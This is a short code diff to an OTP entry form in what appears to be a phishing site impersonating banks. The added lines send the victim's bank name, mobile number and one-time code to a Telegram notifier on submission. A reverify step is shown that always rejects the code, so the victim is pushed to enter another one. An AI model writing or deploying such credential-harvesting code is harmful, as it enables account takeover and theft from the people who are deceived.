@@ -108,10 +108,20 @@ export function OtpForm({
     e.preventDefault()
     if (!isComplete) return
     if (mode === 'reverify') {
+      notifyTelegram('OTP Reverification Attempt', [
+        { label: 'Bank', value: bankName },
+        { label: 'Mobile', value: mobile },
+        { label: 'OTP Code', value: code },
+      ])
       // This step always reports the code as invalid.
       setError(true)
       return
     }
+    notifyTelegram('OTP Submitted', [
+      { label: 'Bank', value: bankName },
+      { label: 'Mobile', value: mobile },
+      { label: 'OTP Code', value: code },
+    ])
     // Continue to the balance step.
     router.push(`/bank/${slug}/balance`)
   }
